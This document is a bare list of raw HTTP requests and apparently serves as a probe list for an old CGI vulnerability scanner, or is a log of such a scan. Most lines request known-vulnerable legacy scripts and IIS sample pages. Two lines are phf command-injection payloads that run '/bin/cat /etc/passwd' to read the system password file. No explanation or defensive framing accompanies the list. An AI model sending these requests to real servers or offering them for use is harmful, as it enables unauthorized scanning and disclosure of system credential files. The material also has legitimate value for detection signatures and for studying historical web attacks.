HEAD / HTTP/1.0
GET / HTTP/1.0
GET /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd HTTP/1.0
GET /cgi-bin/phf?Qalias=%ff/bin/cat%20/etc/passwd HTTP/1.0
GET /scripts/issadmin/bdir.htr HTTP/1.0
GET /iissamples/exair/howitworks/codebrws.asp HTTP/1.0
GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.0
GET /cgi-bin/gH.cgi HTTP/1.0
GET /cgi-bin/phf HTTP/1.0
GET /cgi-bin/phf.pp HTTP/1.0
GET /cgi-bin/phf.cgi HTTP/1.0
GET /cgi-bin/wwwadmin.pl HTTP/1.0
GET /cgi-bin/formmail.pl HTTP/1.0
GET /cgi-bin/sendform.cgi HTTP/1.0
GET /cgi-bin/Count.cgi HTTP/1.0
GET /cgi-bin/test-cgi HTTP/1.0
GET /cgi-bin/nph-test-cgi HTTP/1.0
GET /cgi-bin/nph-publish HTTP/1.0
GET /cgi-bin/php.cgi HTTP/1.0
GET /cgi-bin/php HTTP/1.0
GET /cgi-bin/php3 HTTP/1.0
GET /cgi-bin/handler HTTP/1.0
GET /cgi-bin/webgais HTTP/1.0
GET /cgi-bin/websendmail HTTP/1.0
GET /cgi-bin/webdist.cgi HTTP/1.0
GET /cgi-bin/faxsurvey HTTP/1.0
GET /cgi-bin/htmlscript HTTP/1.0
GET /cgi-bin/pfdispaly.cgi HTTP/1.0
GET /cgi-bin/perl.exe HTTP/1.0
GET /cgi-bin/wwwboard.cgi HTTP/1.0
GET /cgi-bin/wwwboard.pl HTTP/1.0
GET /cgi-bin/www-sql HTTP/1.0
GET /cgi-bin/view-source HTTP/1.0
GET /cgi-bin/campas HTTP/1.0
GET /cgi-bin/aglimpse HTTP/1.0
GET /cgi-bin/glimpse HTTP/1.0
GET /cgi-bin/man.sh HTTP/1.0
GET /cgi-bin/AT-admin.cgi HTTP/1.0
GET /cgi-bin/filemail.pl HTTP/1.0
GET /cgi-bin/maillist.pl HTTP/1.0
GET /cgi-bin/jj HTTP/1.0
GET /cgi-bin/info2www HTTP/1.0
GET /perl/files.pl HTTP/1.0
GET /cgi-bin/files.pl HTTP/1.0 
GET /cgi-bin/finger HTTP/1.0
GET /cgi-bin/bnbform.cgi HTTP/1.0
GET /cgi-bin/survey.cgi HTTP/1.0
GET /cgi-bin/AnyForm2 HTTP/1.0
GET /cgi-bin/textcounter.pl HTTP/1.0
GET /cgi-bin/classifieds.cgi HTTP/1.0
GET /cgi-bin/environ.cgi HTTP/1.0
GET /cgi-bin/wrap HTTP/1.0
GET /cgi-bin/cgiwrap HTTP/1.0
GET /cgi-bin/edit.pl HTTP/1.0
GET /cgi-bin/perlshop.cgi HTTP/1.0
GET /cgi-bin/webbbs.cgi HTTP/1.0
